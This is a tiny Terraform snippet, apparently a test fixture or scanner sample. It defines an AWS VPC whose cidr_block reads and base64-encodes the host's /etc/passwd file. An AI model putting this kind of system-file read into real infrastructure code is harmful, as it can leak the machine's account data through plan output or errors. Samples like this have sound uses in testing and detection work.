
resource "aws_vpc" "main" {
  cidr_block = filebase64("/etc/passwd")
}
